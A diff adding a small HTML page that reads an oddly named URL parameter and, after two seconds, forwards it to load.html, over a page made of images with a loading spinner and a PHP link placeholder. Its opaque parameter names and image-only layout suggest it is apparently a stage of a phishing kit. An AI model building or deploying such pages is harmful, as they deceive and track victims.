@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Display Value from URL</title>
+  <script>
+    // Function to extract query parameter value
+    function getQueryParameter(parameterName) {
+      var queryString = window.location.search;
+      var urlParams = new URLSearchParams(queryString);
+      return urlParams.get(parameterName);
+    }
+    // Get the value from the 'data' query parameter
+    var value = getQueryParameter('vbgfhbhfghgfhfghf');
+    
+     function redirectToDestination() {
+    // Redirect to the destination page with the variable value in the URL
+    window.location.href = "load.html?jdfgjfgjfgjgdjgdj=" + (value);
+    }
+
+    // Automatically redirect after a certain delay (e.g., 2 seconds)
+    setTimeout(redirectToDestination, 2000);
+   
+
+  </script>
+</head>
+<body>
+ <img style="width:100%;" src="./files/ztop1.png">
+<div style="display: inline-block;">
+<img style="margin-left:px; margin-top:-4px;" src="./files/zlt1.png"> 
+<a href="<?=$urk?>"><img style="margin-left:380px; margin-bottom:200px;" id="myImage"  src="./files/loading-spinner-2684655676"></a></div>
+</body>
+</html>
+
